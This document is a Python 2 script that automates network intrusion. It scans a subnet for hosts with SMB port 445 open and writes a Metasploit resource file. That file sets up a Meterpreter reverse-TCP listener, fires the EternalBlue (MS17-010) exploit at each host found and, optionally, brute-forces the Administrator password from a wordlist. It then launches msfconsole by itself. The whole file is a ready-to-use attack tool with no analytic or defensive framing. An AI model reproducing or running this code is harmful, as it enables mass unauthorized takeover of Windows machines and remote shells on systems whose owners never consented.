import os
import optparse
import sys
import nmap

def findTarget(subnet):
    nmscan = nmap.PortScanner()
    nmscan.scan(subnet, '445')
    targethosts = []
    for host in nmscan.all_hosts():
        if nmscan[host].has_tcp(445):
            state = nmscan[host]['tcp'][445]['state']
            if state == 'open':
                print '[+] Found Target Host: ' +host
                targethosts.append(host)
    return targethosts
def reverseHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set payload '+\
            'windows/x64/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')
def exploit(configFile, lhost, lport, tgtHost):
    configFile.write('use exploit/windows/smb/ms17_010_eternalblue\n')
    configFile.write('set payload '+\
            'windows/x64/meterpreter/reverse_tcp\n')
    configFile.write('set RHOST ' +str(tgtHost) + '\n')
    configFile.write('set LPORT ' +str(lport) +'\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
def SMBBruteForce(configFile, lhost, lport, tgtHost, passwordFile):
    username = 'Administrator'
    pf = open(passwordFile, 'r')
    for password in pf.readlines():
        password = password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/ms17_010_eternalblue\n')
        configFile.write('set payload '+\
                'windows/x64/meterpreter/reverse_tcp\n')
        configFile.write('set SMBUser ' +str(username) + '\n')
        configFile.write('set SMBPass ' +str(password) + '\n')
        configFile.write('set RHOST ' +str(tgtHost) + '\n')
        configFile.write('set LPORT ' + str(lport) + '\n')
        configFile.write('set LHOST ' + lhost + '\n')
        configFile.write('exploit -j -z\n')
def main():
    configFile = open('meta.rc', 'w')
    parser = optparse.OptionParser('[-] Usage%prog '+\
            '-H <RHOST[s]> -l <LHOST> [ -p <LPORT> -F <Password File>]')
    parser.add_option('-H', dest='tgtHost', type='string',\
            help='specify the target address[es]')
    parser.add_option('-p', dest='lport', type='string',\
            help='specify the listen port')
    parser.add_option('-l', dest='lhost', type='string',\
            help='specify the listen host')
    parser.add_option('-F', dest='passwordFile', type='string',\
            help='specify the password file for smb bruteforce')
    (options, args) = parser.parse_args()
    if (options.tgtHost == None) |(options.lhost == None):
        print parser.usage
        exit(0)
    lhost = options.lhost
    lport = options.lport
    if lport == None:
        lport = '4444'
    passwordFile = options.passwordFile
    tgtHosts = findTarget(options.tgtHost)
    reverseHandler(configFile, lhost, lport)
    for tgtHost in tgtHosts:
        exploit(configFile, lhost, lport, tgtHost)
        if passwordFile != None:
            SMBBruteForce(configFile, lhost, lport, tgtHost, passwordFile)
    configFile.close()
    os.system('msfconsole -r meta.rc')
if __name__ == '__main__':
    main()
